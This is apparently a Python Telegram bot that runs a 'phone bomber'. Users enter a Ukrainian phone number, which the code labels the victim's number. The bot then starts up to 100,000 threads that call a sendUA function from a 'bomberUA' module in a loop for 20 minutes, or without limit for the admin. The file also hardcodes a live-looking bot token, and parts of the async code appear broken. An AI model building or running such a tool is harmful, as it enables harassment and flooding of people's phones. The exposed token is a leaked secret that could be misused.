from aiogram import Bot, Dispatcher, types, executor
from threading import Thread
import random, datetime, time
from datetime import datetime, timedelta
from bomberUA import sendUA
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton

TOKEN = '1873181031:AAFogpKvVX4J9lskIKIUVmxi8mbtXQpEwWE'

bot = Bot(TOKEN)
dp = Dispatcher(bot)

THREADS_LIMIT = 100000
running_spams_per_chat_id = []
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
ADMIN_CHAT_ID = 168

go_start = ReplyKeyboardMarkup(resize_keyboard=True)
start_attack = KeyboardButton(text='📲 Запустить спам')
stop_attack = KeyboardButton(text='❗️ Остановить Атаку')
go_start.add(start_attack).insert(stop_attack)

def start_spam_vip(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)
	bot.send_message(chat_id, f'‍📱 Номер жертвы: <code>+{phone_number}</code>\n⏱ Продолжительность: <code>20 минут</code>\n💥 Атака запущенa!', parse_mode='HTML')
	end = datetime.now() + timedelta(minutes = 20)
	while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		sendUA(phone_number)
	bot.send_message(chat_id, f'<b>Спам на номер {phone_number} завершён</b>', parse_mode='HTML')
	THREADS_AMOUNT[0] -= 1 # стояло 1
	try:
		running_spams_per_chat_id.remove(chat_id)
	except Exception:
		pass
def spam_handler_vip(phone, chat_id, force):
	if int(chat_id) in running_spams_per_chat_id:
		bot.send_message(chat_id, '🛑 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить атаку ❌" и попробуйте снова')
		return

	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		x = Thread(target=start_spam_vip, args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 1
		x.start()
def start_spam(message):
	text = message.text
	chat_id = int(message.chat.id)
	if len(text) == 12:
		phone = text
		bot.send_message(message.chat.id, 'Запуск сессии - ✅')
		spam_handler_vip(phone, chat_id, force=False)

@dp.message_handler(commands=['start', 'старт'])
async def start_command(message: types.Message):
	await bot.send_message(chat_id=message.chat.id,
						   text='1',
						   parse_mode="HTML",
						   reply_markup=go_start)

@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text
    if text == '📲 Запустить спам':
        await bot.send_message(chat_id, 'Введите номер в формате:\n🇺🇦 380*********\n')
        dp.register_message_handler(start_spam)
    elif text == '❗️ Остановить Атаку':
        if chat_id not in running_spams_per_chat_id:
            await bot.send_message(chat_id, '🛑 Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)
            await bot.send_message(chat_id, '✅ Спам остановлен')
            if chat_id not in running_spams_per_chat_id:
                THREADS_AMOUNT[0] -= 1

if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)


